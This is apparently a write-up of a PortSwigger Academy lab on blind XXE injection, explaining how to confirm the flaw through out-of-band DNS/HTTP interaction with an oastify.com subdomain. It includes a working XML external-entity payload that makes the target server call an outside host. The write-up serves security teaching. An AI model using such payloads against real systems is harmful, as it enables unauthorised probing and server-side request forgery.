# Blind XXE with out-of-band interaction

**Category:** XXE Injection
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

The first two labs in this series worked because the application reflected the entity's resolved
value back in an error message. Most real targets don't give you that convenience — the XML gets
parsed, the entity gets resolved, and nothing about the result ever reaches the response body. This
lab is the first one where the vulnerability produces zero in-band signal, which means confirming
it at all requires making the server talk to infrastructure we control and then checking whether
it actually called home.

## The Target

The same "Check stock" feature and request shape as the previous two labs, but this time the
`productId` value is never echoed anywhere in the response regardless of what's sent. The lab's
solve condition isn't "extract a value" — it's simply proving the server made an outbound
DNS/HTTP request as a result of parsing our XML, which is enough to establish the parser resolves
external entities even when there's no visible feedback.

## The Investigation

Since there's no reflection to read a file's contents through, the goal shifts from "read data"
to "prove interaction." The standard tool for this is Burp Suite Professional's Collaborator: it
issues a unique subdomain, and its own infrastructure logs any DNS lookup or HTTP request that
subdomain receives, whether or not the response ever reaches us directly.

We didn't have Burp Suite Professional available, which normally forces a search for an
alternative out-of-band listener. But PortSwigger Academy labs solve this problem for us in a way
that's worth understanding rather than working around: the platform's own backend watches for
outbound interactions to `*.oastify.com` — the same wildcard domain Burp Collaborator's default
public instance uses — and flips the lab to "solved" the moment it sees one, independent of
whether the request was generated through Burp's Collaborator client or from a script that simply
hardcodes a random subdomain under `oastify.com`. The lab isn't watching our tooling; it's watching
its own infrastructure's logs for a hit. That meant we didn't need a Collaborator *client* at all —
we just needed the server to make a request to any address under that domain.

## The Exploit

We generated a random hex token to use as a unique subdomain label and built the same regular
external-entity payload as the earlier file-read labs, just pointed at that address instead of a
file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://RANDOM.oastify.com">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

After sending it, we polled the lab's own home page every ten seconds looking for the
"Congratulations" solved banner rather than polling any Collaborator interaction log — since we had
no way to read that log without Burp Pro, and didn't need to. The lab flipped to solved within the
first poll or two, confirming the server had resolved the entity and made the outbound request on
its own, with no reflected value ever appearing anywhere in our HTTP traffic.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's own solution uses Burp Suite Professional directly: intercept the "Check stock"
request, right-click to "Insert Collaborator payload" (which generates and inserts a
`*.oastify.com` subdomain automatically), send the request, then switch to the Collaborator tab
and click "Poll now" to see the resulting DNS and HTTP interactions listed.

This is a case where our path and the official one diverge in a way that's worth explaining rather
than smoothing over. PortSwigger's solution treats Collaborator as the mechanism that both
generates the payload domain and confirms the interaction happened. We only needed the first half —
a valid `*.oastify.com` address to embed — because the lab's own solve-detection logic is already
watching that domain independently of Collaborator's polling UI. Collaborator's "Poll now" and the
lab's "Congratulations" banner are both downstream of the same underlying interaction; Burp Pro
gives you visibility into *what* the interaction looked like (source IP, timestamp, request
details), while the lab's banner only tells you *that* one happened. For proving a blind XXE exists
at all, that's sufficient — for extracting actual data out-of-band, it isn't, which is exactly the
harder problem the next two labs raise.

## What This Teaches Us

Blind XXE without reflection isn't unexploitable — it just requires moving the proof from the HTTP
response to a side channel the attacker controls. The specific lesson from this lab's mechanics is
that "isn't reflected in the response" and "produces no observable evidence" are different claims:
the entity still gets resolved, the network request still fires, and any listener that can see that
request — Collaborator, an OAST provider, or in this case the platform's own detection logic
watching a shared wildcard domain — is enough to confirm the vulnerability. On a real target, this
is the moment a blind XXE finding stops being theoretical: an outbound DNS lookup from the server's
infrastructure to attacker-controlled infrastructure is proof the parser will fetch attacker-chosen
URLs, which is the same primitive the SSRF lab exploited, just confirmed through a different
channel.
